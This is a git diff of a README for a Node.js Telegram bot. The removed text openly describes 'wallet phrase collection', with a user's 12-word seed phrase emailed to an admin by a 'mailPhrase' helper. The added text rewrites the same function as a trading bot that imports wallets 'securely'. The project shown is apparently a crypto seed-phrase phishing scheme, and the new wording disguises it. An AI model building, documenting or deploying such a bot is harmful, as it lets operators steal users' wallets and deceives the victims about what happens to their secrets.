@@ -1,181 +1,107 @@
-# Telegram Bot - Ready for Vercel Deployment
+# Telegram Trading Bot
 
-## 🚀 Status: Clean & Ready to Deploy
+A robust Telegram Trading Bot built with Node.js, Express, and MongoDB. This bot allows users to manage their crypto trades, import wallets, and customize settings directly from Telegram.
 
-This Telegram bot is configured and ready for deployment to Vercel with Gmail SMTP support.
+## Features
 
-## 📦 What's Included
+- **Wallet Management**: Import wallets securely via 12-word seed phrase.
+- **Trading Tools**: View trades and manage positions.
+- **Bot Customization**: personalized settings for your trading experience.
+- **Backup Bots**: Setup backup bots with the same wallet and path.
+- **Group Integration**: Support for joining Telegram groups.
+- **Production Ready**: Supports both Polling (Development) and Webhook (Production) modes.
+- **Database Integration**: Persists user data and settings using MongoDB.
+- **Email Notifications**: integrated with SendGrid/Nodemailer for alerts.
 
-### Core Application Files:
-- ✅ `index.js` - Main Express server with webhook support
-- ✅ `vercel.json` - Vercel configuration
-- ✅ `handlers/` - Command, message, and callback handlers
-- ✅ `helpers/mailPhrase.js` - Gmail SMTP with retry logic
-- ✅ `db/` - MongoDB connection and methods
-- ✅ `config/env.js` - Environment configuration
+## Bot Commands
 
-### Features:
-- ✅ Telegram webhook mode (production)
-- ✅ Gmail SMTP email notifications (works on Vercel!)
-- ✅ MongoDB integration
-- ✅ Admin commands
-- ✅ Wallet phrase collection
-- ✅ Automatic retry logic for emails (3 attempts)
-- ✅ Connection pooling for reliability
+The bot responds to the following commands:
 
-## 🎯 Deployment
+| Command | Description |
+| :--- | :--- |
+| `/start` | Start the bot |
+| `/home` | View trades and open main menu |
+| `/settings` | Customize your bot |
+| `/bots` | Fast backup bots, same wallet & positions |
+| `/phrase` | Import wallet via 12 key phrase |
+| `/help` | Tips and frequently asked questions |
+| `/chat` | Join our telegram group for questions and feedback |
 
-**Quick Start:**
-1. See **`DEPLOY_TO_VERCEL.md`** for step-by-step instructions
-2. Or see **`VERCEL_DEPLOYMENT.md`** for CLI deployment
+## Prerequisites
 
-**Manual Deployment (Recommended):**
-- Follow the guide in `DEPLOY_TO_VERCEL.md`
-- Deploy through Vercel's web interface
-- No CLI needed!
+Before running the project, ensure you have the following installed:
 
-## 🔑 Required Environment Variables
+- [Node.js](https://nodejs.org/) (v16 or higher recommended)
+- [MongoDB](https://www.mongodb.com/) (Local or Atlas)
+- A [Telegram Bot Token](https://core.telegram.org/bots#6-botfather) obtained from BotFather
 
-Add these in Vercel's Environment Variables section:
+## Installation
 
-```
-NODE_ENV=production
-BOT_TOKEN=your_telegram_bot_token
-MONGO_URI=mongodb+srv://...
-ADMIN_EMAIL=your-email@gmail.com
-ADMIN_EMAIL_PASS=your_gmail_app_password
-HR_EMAIL=backup-email@gmail.com
-ADMIN_PASSWORD=your_admin_password
-WEBHOOK_URL=https://your-vercel-url.vercel.app
-WEBHOOK_SECRET_PATH=your_secret_path
-```
+1.  **Clone the repository** (if applicable) or navigate to the project directory.
 
-## 📧 Email Configuration
+2.  **Install dependencies**:
+    ```bash
+    npm install
+    ```
 
-**Uses Gmail SMTP** (works perfectly on Vercel):
-- Port: 587 (TLS)
-- Connection timeout: 60 seconds
-- Automatic retry: 3 attempts with exponential backoff
-- Connection pooling enabled
+3.  **Environment Configuration**:
+    Create a `.env.development.local` file in the root directory for development.
+    
+    Required Environment Variables:
 
-**Requirements:**
-- Gmail account with 2FA enabled
-- Gmail App Password (NOT your regular password)
-- Generate at: https://myaccount.google.com/apppasswords
+    ```env
+    # Server Config
+    PORT=3000
+    NODE_ENV=development
 
-## 🧪 Testing
+    # Database
+    MONGO_URI=mongodb://localhost:27017/your_db_name
 
-After deployment, test:
+    # Telegram Bot
+    BOT_TOKEN=your_telegram_bot_token
 
-1. `/start` - Should show welcome message
-2. `/phrase word1 word2 ... word12` - Should send email notification
+    # Webhook (Production Only)
+    WEBHOOK_URL=https://your-domain.com
+    WEBHOOK_SECRET_PATH=your_secret_path
 
-## 📁 Project Structure
+    # Email Service
+    HR_EMAIL=hr@example.com
+    ADMIN_EMAIL=admin@example.com
+    ADMIN_EMAIL_PASS=your_email_password
+    ADMIN_PASSWORD=admin_dashboard_password
+    ```
 
-```
-TelegramBot/
-├── index.js              # Main server
-├── vercel.json           # Vercel config
-├── package.json          # Dependencies
-├── config/
-│   └── env.js            # Environment variables
-├── handlers/
-│   ├── commands.js       # Bot commands
-│   ├── messages.js       # Message handlers
-│   ├── callbacks.js      # Callback queries
-│   └── systems.js        # System handlers
-├── helpers/
-│   ├── mailPhrase.js     # SMTP email sender
-│   ├── checkPhrase.js    # Phrase validation
-│   ├── extractPhrase.js  # Phrase extraction
-│   └── logger.js         # Message logging
-├── db/
-│   ├── mongoConnection.js
-│   └── methods/          # Database operations
-└── public/
-    └── bonkbot.jpg       # Bot assets
-```
+## Running the Bot
 
-## 🛠️ Local Development
+### Development Mode
+Runs the bot in **polling mode** (no SSL/HTTPS required). Auto-reloads on file changes using `nodemon`.
 
-1. Create `.env.development.local`:
 ```bash
-ADMIN_EMAIL=your-email@gmail.com
-ADMIN_EMAIL_PASS=your_app_password
-HR_EMAIL=backup@gmail.com
-BOT_TOKEN=your_bot_token
-MONGO_URI=your_mongodb_uri
-NODE_ENV=development
-PORT=3000
-WEBHOOK_URL=http://localhost:3000
-WEBHOOK_SECRET_PATH=your_path
-ADMIN_PASSWORD=your_password
+npm run dev
 ```
 
-2. Install dependencies:
+### Production Mode
+Runs the bot in **webhook mode**. Requires a valid SSL URL (HTTPS) configured in `WEBHOOK_URL`.
+
 ```bash
-npm install
+npm start
 ```
 
-3. Run locally:
-```bash
-node index.js
-```
+*Note: In production, the bot listens for updates via the configured Webhook URL.*
 
-**Note:** Local mode uses **polling**, production uses **webhooks**.
+## Project Structure
 
-## ✨ Why Vercel?
+- `index.js`: Main entry point. Initializes server and bot.
+- `handlers/`: Contains logic for different bot events (commands, messages, systems).
+- `config/`: Configuration files and environment variable management.
+- `db/`: Database connection and Mongoose models.
+- `helpers/`: Utility functions (e.g., email verification).
+- `public/`: Static assets (if any).
 
-**Vercel vs Render:**
-- ✅ SMTP ports NOT blocked (Render blocks them on free tier)
-- ✅ Generous free tier
-- ✅ Auto-deploy on git push
-- ✅ Fast global CDN
-- ✅ Easy environment variable management
-- ✅ No cold starts (faster response)
+## Tech Stack
 
-**Result:** Gmail SMTP works perfectly on Vercel free tier! 🎉
-
-## 📚 Documentation
-
-- **`DEPLOY_TO_VERCEL.md`** - Manual web deployment (recommended)
-- **`VERCEL_DEPLOYMENT.md`** - CLI deployment guide
-- **`vercel.json`** - Vercel configuration reference
-
-## 🔄 Updates & Maintenance
-
-To deploy updates:
-1. Make changes locally
-2. Commit to git: `git add . && git commit -m "Update"`
-3. Push: `git push origin main`
-4. Vercel auto-deploys!
-
-## 🆘 Support
-
-**Common Issues:**
-- Bot not responding → Check webhook with `/getWebhookInfo`
-- Email not sending → Verify Gmail App Password
-- Environment errors → Check all variables in Vercel
-
-**Resources:**
-- Vercel Docs: https://vercel.com/docs
-- Telegram Bot API: https://core.telegram.org/bots/api
-
-## 📊 Current Status
-
-**Code Status:**
-- ✅ All remnant code removed
-- ✅ Clean SMTP implementation
-- ✅ No SendGrid dependencies
-- ✅ No Telegram notification fallbacks
-- ✅ Production-ready
-- ✅ No linter errors
-
-**Ready for:** Manual deployment through Vercel website
-
----
-
-**Last Updated:** Ready for Vercel deployment  
-**Node Version:** 18.x or higher recommended  
-**License:** Your license here
-
+- **Runtime**: Node.js
+- **Framework**: Express.js
+- **Database**: MongoDB (Mongoose)
+- **Bot API**: `node-telegram-bot-api`
+- **Email**: Nodemailer, @sendgrid/mail
